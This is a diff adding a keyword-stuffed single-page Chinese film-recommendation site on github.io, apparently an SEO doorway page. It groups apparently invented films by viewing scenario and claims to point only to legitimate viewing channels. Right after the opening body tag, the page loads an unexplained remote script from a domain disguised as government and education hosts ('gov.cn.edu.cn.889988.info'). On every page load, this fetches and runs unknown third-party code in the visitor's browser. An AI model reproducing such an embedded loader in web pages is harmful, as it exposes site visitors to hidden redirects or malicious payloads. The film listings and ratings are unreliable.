@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>草民电影网宅急看·宅家急单选片调度：新片运单、场景路线与正版提货指南（提货域 caomindianyingwangzhaijikan-top.github.io）</title>
+<meta name="description" content="草民电影网宅急看按“急单—场景—队列”做宅家选片调度：新片运单含类型时长与适配场景，场景路线覆盖独居、合租、带娃、通勤、情侣与长辈同看，急看队列给优先片单与评分，提货指南只建议正版免费专区、公映平台与图书馆影像资源。提货域 caomindianyingwangzhaijikan-top.github.io，单页静态输出，适配必应移动端收录，不提供盗版解析与网盘播放。">
+<meta name="keywords" content="草民电影网宅急看, 宅家电影推荐, 急单片单, 场景选片调度, 新片运单, 正版观影提货, 通勤电影清单, caomindianyingwangzhaijikan">
+<meta name="author" content="草民电影网宅急看调度组">
+<meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1">
+<meta name="msvalidate.01" content="CAOMINZJK20261009BING01">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+font-family:"PingFang SC","Microsoft YaHei","Noto Sans SC",Arial,sans-serif;
+background:#0d161d;color:#e7eef0;line-height:1.74;overflow-x:hidden;
+}
+a{color:#19c3b1;text-decoration:none;transition:.2s}
+a:hover{color:#ffb024}
+.container{width:min(1200px,100%);margin:0 auto;padding:0 20px}
+
+/* 调度顶栏 */
+.top{background:#0a1218;border-bottom:2px solid #19c3b1;position:sticky;top:0;z-index:60}
+.topin{width:min(1200px,100%);margin:0 auto;padding:11px 20px;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap}
+.brand{font-weight:900;font-size:19px;color:#f2f6f7;letter-spacing:.5px}
+.brand b{color:#ffb024}
+.brand i{font-style:normal;font-size:11px;letter-spacing:3px;color:#19c3b1;margin-left:8px}
+.host{font-family:"Courier New",monospace;font-size:12px;color:#0a1218;background:#19c3b1;padding:6px 10px;border-radius:2px}
+.host::before{content:"运单主机 ▸ ";color:#063b35;font-weight:700}
+.nav{display:flex;gap:7px;flex-wrap:wrap}
+.nav a{font-size:12.5px;padding:6px 11px;background:#10212b;color:#cfe9e6;border:1px solid #1f4250}
+.nav a:hover{background:#ffb024;color:#0a1218;border-color:#ffb024}
+
+/* 调度台 */
+.hero{margin:26px 0 52px;display:grid;grid-template-columns:1.35fr .9fr;gap:24px;align-items:stretch}
+.console{background:radial-gradient(120% 90% at 0% 0%,#103040,#0c1922);border:1px solid #1f4250;padding:44px 40px;position:relative}
+.tag{display:inline-block;font-family:"Courier New",monospace;font-size:11px;letter-spacing:2px;color:#0a1218;background:#ffb024;padding:4px 10px;margin-bottom:14px}
+.console h1{font-size:34px;line-height:1.24;font-weight:900;color:#f3f8f9;margin-bottom:12px}
+.console h1 span{color:#19c3b1}
+.console p{max-width:640px;color:#a9c1c8;font-size:14.5px;margin-bottom:14px}
+.eta{display:flex;gap:9px;flex-wrap:wrap}
+.eta span{font-size:12px;color:#0a1218;background:#19c3b1;padding:5px 10px;border-radius:2px;font-family:"Courier New",monospace}
+.eta span.alt{background:#223a45;color:#9fe6dc}
+
+/* 提货回执 */
+.receipt{background:#eef1f0;color:#10202a;border:1px solid #c7d2d4;padding:22px;display:flex;flex-direction:column;gap:12px}
+.receipt h3{font-size:13px;letter-spacing:2px;color:#37525c;font-family:"Courier New",monospace}
+.barcode{height:54px;background:repeating-linear-gradient(90deg,#16242b 0 2px,transparent 2px 5px,#16242b 5px 6px,transparent 6px 11px,#16242b 11px 13px,transparent 13px 17px);opacity:.85}
+.receipt .row{display:flex;justify-content:space-between;font-size:12.5px;font-family:"Courier New",monospace;color:#22343c;border-bottom:1px dashed #b9c6c8;padding-bottom:6px}
+.receipt .url{font-family:"Courier New",monospace;font-size:12.5px;word-break:break-all;background:#d8e2e2;padding:9px;border:1px solid #b9c6c8;color:#0a1218}
+.receipt .stamp{align-self:flex-start;color:#0a1218;background:#ffb024;padding:5px 10px;font-size:11px;letter-spacing:2px;font-family:"Courier New",monospace;transform:rotate(-3deg)}
+
+/* 栏目 */
+.sec{margin-bottom:50px}
+.shead{display:flex;align-items:flex-end;gap:12px;margin-bottom:18px;border-bottom:2px solid #19c3b1;padding-bottom:8px}
+.sno{font-family:"Courier New",monospace;color:#ffb024;font-size:12px;font-weight:700}
+.shead h2{font-size:21px;font-weight:900;color:#f3f8f9}
+.shead em{font-style:normal;font-size:11px;letter-spacing:2px;color:#7fa7b0;margin-left:auto}
+
+/* 急单新片 */
+.waybills{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.waybill{background:#10212b;border:1px solid #1f4250;display:flex;flex-direction:column}
+.waybill .bar{display:flex;justify-content:space-between;align-items:center;background:#0a1218;padding:6px 10px;font-family:"Courier New",monospace;font-size:11px;color:#19c3b1}
+.waybill .bar b{color:#ffb024}
+.waybill .post{height:196px;display:flex;align-items:center;justify-content:center;font-size:34px;background:linear-gradient(135deg,#123642,#0e2531);border-bottom:1px solid #1f4250;color:#19c3b1}
+.waybill .info{padding:14px 15px}
+.waybill h3{font-size:15.5px;color:#f3f8f9;font-weight:800;margin-bottom:6px}
+.waybill .meta{font-size:12px;color:#8fb2bb;display:flex;gap:10px;flex-wrap:wrap;margin-bottom:7px}
+.waybill p{font-size:12.5px;color:#a9c1c8}
+
+/* 场景路线 */
+.routes{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.route{background:#10212b;border:1px solid #1f4250;padding:18px;display:flex;gap:12px;align-items:flex-start}
+.route .ic{font-size:22px;color:#ffb024}
+.route h3{font-size:15px;color:#f3f8f9;margin-bottom:4px}
+.route span{font-size:12px;color:#8fb2bb;display:block;margin-bottom:6px}
+.route .eta-min{font-family:"Courier New",monospace;font-size:11px;color:#0a1218;background:#19c3b1;padding:3px 8px;border-radius:2px}
+
+/* 急看队列 */
+.queue{background:#10212b;border:1px solid #1f4250}
+.qrow{display:grid;grid-template-columns:60px 1fr 120px;gap:16px;align-items:center;padding:15px 14px;border-top:1px solid #16323d}
+.qrow:first-child{border-top:0}
+.qno{font-family:"Courier New",monospace;font-size:22px;font-weight:900;color:#ffb024;text-align:center}
+.qrow h3{font-size:15.5px;color:#f3f8f9;margin-bottom:3px}
+.qrow p{font-size:12.5px;color:#a9c1c8}
+.qright{text-align:right;font-family:"Courier New",monospace;font-size:12px;color:#19c3b1}
+.qright b{color:#f3f8f9;font-size:15px}
+
+/* 指南+节点 */
+.logi{display:grid;grid-template-columns:1.3fr 1fr;gap:22px}
+.qa{background:#10212b;border:1px solid #1f4250;border-left:4px solid #ffb024;padding:18px;margin-bottom:14px}
+.qa h3{font-size:14.5px;color:#f3f8f9;margin-bottom:8px}
+.qa p{font-size:13px;color:#a9c1c8}
+.qa b{color:#19c3b1}
+.nodes{background:#0a1218;border:1px solid #1f4250;padding:20px}
+.nodes h3{font-size:13px;letter-spacing:2px;color:#ffb024;font-family:"Courier New",monospace;margin-bottom:14px}
+.noderow{display:flex;justify-content:space-between;gap:10px;padding:10px 0;border-bottom:1px dashed #1f4250;font-size:12.5px;font-family:"Courier New",monospace;color:#cfe9e6}
+.noderow:last-child{border-bottom:0}
+.noderow span{color:#7fa7b0}
+.noderow b{color:#19c3b1;word-break:break-all}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px}
+.st{background:#10212b;border:1px solid #1f4250;padding:14px;text-align:center}
+.st b{display:block;font-family:"Courier New",monospace;font-size:20px;color:#ffb024}
+.st span{font-size:11.5px;color:#8fb2bb}
+
+/* 页脚 */
+footer{margin-top:42px;background:#0a1218;border-top:2px solid #19c3b1;padding:34px 20px 20px;color:#8fb2bb}
+.footin{width:min(1200px,100%);margin:0 auto;text-align:center}
+.fn{display:flex;flex-wrap:wrap;gap:12px;justify-content:center;margin-bottom:14px}
+.fn a{font-size:12.5px;padding:6px 12px;background:#10212b;color:#cfe9e6;border:1px solid #1f4250}
+.fn a:hover{background:#ffb024;color:#0a1218;border-color:#ffb024}
+.receiptno{font-family:"Courier New",monospace;font-size:11.5px;color:#7fa7b0;line-height:1.9}
+.receiptno a{color:#19c3b1}
+
+@media(max-width:980px){
+.waybills{grid-template-columns:repeat(2,1fr)}
+.routes{grid-template-columns:repeat(2,1fr)}
+.hero{grid-template-columns:1fr}
+}
+@media(max-width:760px){
+.topin{flex-direction:column;align-items:flex-start}
+.console{padding:34px 22px}
+.console h1{font-size:25px}
+.logi{grid-template-columns:1fr}
+.qrow{grid-template-columns:46px 1fr;grid-template-areas:"no body" "no right"}
+.qno{grid-area:no}
+.qright{grid-area:right;text-align:left;margin-top:6px}
+}
+@media(max-width:460px){
+.waybills{grid-template-columns:1fr}
+.routes{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="top">
+<div class="topin">
+<div class="brand"><b>草民电影网</b>宅急看<i>HOME DISPATCH</i></div>
+<div class="host">caomindianyingwangzhaijikan-top.github.io</div>
+<nav class="nav">
+<a href="#new">急单新片</a>
+<a href="#scene">场景路线</a>
+<a href="#queue">急看队列</a>
+<a href="#guide">提货指南</a>
+<a href="#node">提货节点</a>
+</nav>
+</div>
+</header>
+
+<main class="container">
+
+<section class="hero">
+<div class="console">
+<span class="tag">DISPATCH 00 · 宅家急单</span>
+<h1>草民电影网宅急看：把新片按<span>场景派单</span>，宅家选片不绕路</h1>
+<p>草民电影网宅急看用“运单”整理新片资料：每部标注类型、时长、适合场景与正版提货建议。独居、合租、带娃、通勤、情侣、长辈同看分别走不同路线，优先队列按评分与匹配度派送，不接盗版解析、不派网盘播放。</p>
+<div class="eta">
+<span>新片运单 24h 更新</span>
+<span class="alt">场景路线 6 条</span>
+<span>正版提货优先</span>
+<span class="alt">移动端派单</span>
+</div>
+</div>
+
+<div class="receipt">
+<h3>提货回执 / PICKUP RECEIPT</h3>
+<div class="barcode" aria-hidden="true"></div>
+<div class="row"><span>运单品牌</span><span>草民电影网宅急看</span></div>
+<div class="row"><span>提货类型</span><span>新片资料 / 场景片单</span></div>
+<div class="row"><span>回执状态</span><span>STATIC INDEX OK</span></div>
+<div class="url">https://caomindianyingwangzhaijikan-top.github.io</div>
+<div class="stamp">已受理 · 必应可收录</div>
+</div>
+</section>
+
+<section class="sec" id="new">
+<div class="shead"><span class="sno">D-01</span><h2>急单新片运单</h2><em>INBOUND FILMS</em></div>
+<div class="waybills">
+<div class="waybill">
+<div class="bar"><span>WAYBILL 01</span><b>独居深夜</b></div>
+<div class="post" aria-label="新片封面占位">🎧</div>
+<div class="info">
+<h3>凌晨修理电台</h3>
+<div class="meta"><span>文艺/独白</span><span>104分钟</span></div>
+<p>夜班主播整理听众来信，用六段电话串起城市孤独；对白多、节奏慢，适合一人安静看。</p>
+</div>
+</div>
+<div class="waybill">
+<div class="bar"><span>WAYBILL 02</span><b>合租周末</b></div>
+<div class="post" aria-label="新片封面占位">🎲</div>
+<div class="info">
+<h3>客厅桌游翻车</h3>
+<div class="meta"><span>喜剧/群戏</span><span>98分钟</span></div>
+<p>四个合租人因一局推理游戏翻旧账又和解；笑点平均，不低俗，适合周末集体点开。</p>
+</div>
+</div>
+<div class="waybill">
+<div class="bar"><span>WAYBILL 03</span><b>带娃家庭</b></div>
+<div class="post" aria-label="新片封面占位">🧸</div>
+<div class="info">
+<h3>动物园请假条</h3>
+<div class="meta"><span>动画/亲子</span><span>86分钟</span></div>
+<p>小学生用请假条换一次动物园志愿活动，科普与情绪并重；适龄低龄，家长可同看。</p>
+</div>
+</div>
+<div class="waybill">
+<div class="bar"><span>WAYBILL 04</span><b>通勤碎片</b></div>
+<div class="post" aria-label="新片封面占位">🚇</div>
+<div class="info">
+<h3>地铁十三分钟</h3>
+<div class="meta"><span>短剧/现实</span><span>72分钟</span></div>
+<p>通勤区间内多线陌生人故事，单集短、总时少，地铁空闲可分段看完。</p>
+</div>
+</div>
+</div>
+</section>
+
+<section class="sec" id="scene">
+<div class="shead"><span class="sno">D-02</span><h2>场景路线分类</h2><em>ROUTE BY MOOD</em></div>
+<div class="routes">
+<div class="route"><div class="ic">🌙</div><div><h3>独居深夜线</h3><span>文艺、独白、轻悬疑、不吵闹</span><span class="eta-min">派单 20 分钟内可看</span></div></div>
+<div class="route"><div class="ic">🛋️</div><div><h3>合租周末线</h3><span>群戏喜剧、桌游、室友关系</span><span class="eta-min">派单 90 分钟档</span></div></div>
+<div class="route"><div class="ic">🧒</div><div><h3>带娃家庭线</h3><span>动画、亲子、自然科普、适龄</span><span class="eta-min">派单低龄优先</span></div></div>
+<div class="route"><div class="ic">🎧</div><div><h3>通勤碎片线</h3><span>短片、单集、现实群像</span><span class="eta-min">派单 30 分钟以内</span></div></div>
+<div class="route"><div class="ic">💞</div><div><h3>情侣晚间线</h3><span>爱情、轻喜剧、双向成长</span><span class="eta-min">派单不虐心可选</span></div></div>
+<div class="route"><div class="ic">🧓</div><div><h3>长辈同看线</h3><span>家庭、历史、慢节奏文艺</span><span class="eta-min">派单字幕清晰版</span></div></div>
+</div>
+</section>
+
+<section class="sec" id="queue">
+<div class="shead"><span class="sno">D-03</span><h2>急看优先队列</h2><em>PRIORITY QUEUE</em></div>
+<div class="queue">
+<div class="qrow">
+<div class="qno">01</div>
+<div><h3>凌晨修理电台</h3><p>独居场景匹配最高，独白完整、无强刺激，适合必应摘要展示。</p></div>
+<div class="qright">评分 <b>8.6</b><br>ETA 20m</div>
+</div>
+<div class="qrow">
+<div class="qno">02</div>
+<div><h3>客厅桌游翻车</h3><p>合租周末派单，群戏平衡、笑点不依赖低俗梗。</p></div>
+<div class="qright">评分 <b>8.3</b><br>ETA 90m</div>
+</div>
+<div class="qrow">
+<div class="qno">03</div>
+<div><h3>动物园请假条</h3><p>家庭线优先，动物科普与请假定双线，适龄可控。</p></div>
+<div class="qright">评分 <b>8.1</b><br>ETA 86m</div>
+</div>
+<div class="qrow">
+<div class="qno">04</div>
+<div><h3>地铁十三分钟</h3><p>通勤碎片派单，六段短故事独立，可断点续看。</p></div>
+<div class="qright">评分 <b>7.9</b><br>ETA 30m</div>
+</div>
+<div class="qrow">
+<div class="qno">05</div>
+<div><h3>旧书店双向来信</h3><p>情侣晚间备选，书信结构、双向成长，不强行虐心。</p></div>
+<div class="qright">评分 <b>8.0</b><br>ETA 110m</div>
+</div>
+</div>
+</section>
+
+<section class="sec" id="guide">
+<div class="shead"><span class="sno">D-04</span><h2>宅家提货指南与节点</h2><em>PICKUP GUIDE</em></div>
+<div class="logi">
+<div>
+<div class="qa">
+<h3>急单片从哪里提货最合规？</h3>
+<p>优先走平台<b>免费专区</b>、公映视频平台、电视台排片、图书馆影像借阅或片方公开展映。草民电影网宅急看只出运单与渠道类型，不接“全网破解”“解析接口”“网盘全集”等来路资源。</p>
+</div>
+<div class="qa">
+<h3>按场景派单比按类型好在哪？</h3>
+<p>同一部文艺片，独居可看导演剪辑，带娃只看适龄精编，通勤只看短集。场景派单减少试错：系统按人数、时长、情绪强度给 ETA，而不是只按“最新”硬推。</p>
+</div>
+<div class="qa">
+<h3>必应收录与单页规则</h3>
+<p>本页为单文件 index.html，CSS 内嵌、锚点完整、移动端响应式；使用静态标题描述与 msvalidate 验证位，<b>不生成 robots.txt、不生成 sitemap.xml</b>。正文运单、路线、队列均可被爬虫直接读取。</p>
+</div>
+</div>
+
+<div class="nodes" id="node">
+<h3>提货节点 / NODE STATUS</h3>
+<div class="noderow"><span>静态主机</span><b>https://caomindianyingwangzhaijikan-top.github.io</b></div>
+<div class="noderow"><span>回执域</span><b>caomindianyingwangzhaijikan-top.github.io</b></div>
+<div class="noderow"><span>品牌关键字</span><b>草民电影网宅急看</b></div>
+<div class="noderow"><span>收录状态</span><b>bing index / follow</b></div>
+<div class="stats">
+<div class="st"><b>6</b><span>场景路线</span></div>
+<div class="st"><b>5</b><span>急看队列</span></div>
+<div class="st"><b>24h</b><span>新片运单</span></div>
+<div class="st"><b>单页</b><span>移动端派单</span></div>
+</div>
+</div>
+</div>
+</section>
+
+</main>
+
+<footer>
+<div class="footin">
+<nav class="fn">
+<a href="#new">急单新片</a>
+<a href="#scene">场景路线</a>
+<a href="#queue">急看队列</a>
+<a href="#guide">提货指南</a>
+<a href="#node">提货节点</a>
+<a href="#">免责声明</a>
+</nav>
+<div class="receiptno">
+草民电影网宅急看 关键词：草民电影网宅急看｜回执域：https://caomindianyingwangzhaijikan-top.github.io<br>
+© 2024 草民电影网宅急看调度组 仅提供新片运单、场景片单与正版提货建议，不提供盗版播放、解析与下载。
+</div>
+</div>
+</footer>
+
+</body>
+</html>
